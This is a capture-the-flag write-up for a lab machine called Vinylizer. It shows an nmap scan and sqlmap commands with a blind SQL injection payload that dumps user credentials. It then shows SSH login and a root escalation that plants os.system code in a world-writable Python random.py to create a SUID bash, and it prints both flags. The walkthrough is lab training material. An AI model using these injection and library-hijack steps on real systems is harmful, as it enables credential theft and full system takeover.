# Vinylizer

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.119:80
Open 10.0.2.119:22
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.119
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f8:e3:79:35:12:8b:e7:41:d4:27:9d:97:a5:14:b6:16 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPn6OQh4Jy9oyM6O/qYWasR3F+jlDB9pa+lt4lIozKUXQj4VQqyApSpeWUa6ab6aRTyLs/FsIIzzN+4UhhATW9Y=
|   256 e3:8b:15:12:6b:ff:97:57:82:e5:20:58:2d:cb:55:33 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHXHoN/UNUABnKuivSNek+xxa08taSiT5Wqm1O3ldxRk
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Vinyl Records Marketplace
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP 

Domain, add it to `/etc/hosts`

![writeup.png](/assets/pentest/hackmyvm/vinylizer/writeup.png)

### SQLi

There's also **Login Form**. SQLi seems to work in **Username** field, however not in **Password** which is probably hashed and checked.

![writeup-1.png](/assets/pentest/hackmyvm/vinylizer/writeup-1.png)

```bash
â””â”€$ sqlmap -u 'http://10.0.2.119/login.php' --data 'username=x&password=x&login=1' -p 'username'  --batch --dbms=MySQL --level 5 --technique=BEU --dbs
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=x' AND 1796=(SELECT (CASE WHEN (1796=1796) THEN 1796 ELSE (SELECT 9158 UNION SELECT 8019) END))-- GXdG&password=x&login=1
---
available databases [3]:
[*] information_schema
[*] performance_schema
[*] vinyl_marketplace
```

```bash
â””â”€$ sqlmap -u 'http://10.0.2.119/login.php' --data 'username=x&password=x&login=1' -p 'username'  --batch --dbms=MySQL --level 5 --technique=BEU -D vinyl_marketplace --tables
Database: vinyl_marketplace
[1 table]
+-------+
| users |
+-------+
```

```bash
â””â”€$ sqlmap -u 'http://10.0.2.119/login.php' --data 'username=x&password=x&login=1' -p 'username'  --batch --dbms=MySQL --level 5 --technique=BEU -D vinyl_marketplace --dump
Database: vinyl_marketplace
Table: users
[2 entries]
+----+----------------------------------+-----------+----------------+
| id | password                         | username  | login_attempts |
+----+----------------------------------+-----------+----------------+
| 1  | 9432522ed1a8fca612b11c3980a031f6 | shopadmin | 0              |
| 2  | password123                      | lana      | 0              |
+----+----------------------------------+-----------+----------------+
```

::: info Creds
`shopadmin:addicted2vinyl`
:::

![writeup-2.png](/assets/pentest/hackmyvm/vinylizer/writeup-2.png)

## SSH

```bash
â””â”€$ sshpass -p 'addicted2vinyl' ssh shopadmin@10.0.2.119
shopadmin@vinylizer:~$ id
uid=1001(shopadmin) gid=1001(shopadmin) groups=1001(shopadmin)
```

### User.txt

```bash
shopadmin@vinylizer:~$ cat user.txt
I_L0V3_V1NYL5
```

## Privilege Escalation

```bash
shopadmin@vinylizer:~$ sudo -l
Matching Defaults entries for shopadmin on vinylizer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User shopadmin may run the following commands on vinylizer:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/vinylizer.py
```

The script uses `json` and `random` module, script itself is not dangerous however we have write 777 permissions on `random.py` ðŸ˜³

```bash
shopadmin@vinylizer:~$ ls -alh $(which python3)
lrwxrwxrwx 1 root root 10 Aug 18  2022 /usr/bin/python3 -> python3.10
shopadmin@vinylizer:~$ find /usr/lib/python3.10/ -perm -0002 -ls
   412822      0 lrwxrwxrwx   1 root     root           35 Nov 20  2023 /usr/lib/python3.10/_sysconfigdata__linux_x86_64-linux-gnu.py -> _sysconfigdata__x86_64-linux-gnu.py
   395345     36 -rwxrwxrwx   1 root     root        33221 Nov 20  2023 /usr/lib/python3.10/random.py
   407487      0 lrwxrwxrwx   1 root     root           41 Nov 20  2023 /usr/lib/python3.10/config-3.10-x86_64-linux-gnu/libpython3.10.so -> ../../x86_64-linux-gnu/libpython3.10.so.1
   395757      0 lrwxrwxrwx   1 root     root           32 Nov 20  2023 /usr/lib/python3.10/sitecustomize.py -> /etc/python3.10/sitecustomize.py
```

Add malicious code
```bash
shopadmin@vinylizer:~$ nano /usr/lib/python3.10/random.py
import os
os.system('install -m4777 /bin/bash /tmp/rootbash')
"""Random variable generators.
```

```bash
shopadmin@vinylizer:~$ sudo /usr/bin/python3 /opt/vinylizer.py
^C
shopadmin@vinylizer:~$ ls -alh /tmp/rootbash
-rwsrwxrwx 1 root root 1.4M Dec  1 15:30 /tmp/rootbash
shopadmin@vinylizer:~$ /tmp/rootbash -p
rootbash-5.1# id
uid=1001(shopadmin) gid=1001(shopadmin) euid=0(root) groups=1001(shopadmin)
```

### Root.txt

```bash
rootbash-5.1# cat /root/root.txt
4UD10PH1L3
```